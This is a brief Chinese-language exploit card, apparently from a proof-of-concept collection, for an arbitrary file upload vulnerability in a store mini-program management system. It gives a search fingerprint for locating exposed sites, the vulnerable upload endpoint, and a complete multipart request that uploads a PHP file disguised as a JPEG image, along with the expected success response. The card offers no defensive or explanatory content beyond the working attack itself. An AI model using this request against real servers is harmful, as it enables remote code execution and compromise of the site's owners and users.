# 万能门店小程序管理系统onepic_uploade任意文件上传漏洞

- **系统**：万能门店小程序管理系统onepic_uploade　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/comhome/cases/index.html"`
- **请求**：`POST /comadmin/Remote/onepic_uploade?file=file HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBiKyL9D0…`

**请求体 / payload**
```
------WebKitFormBoundaryBiKyL9D0p5OtH5zz
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg
<?php phpinfo();unlink(__FILE__);?>
------WebKitFormBoundaryBiKyL9D0p5OtH5zz--
```
- **预期**：200　|　—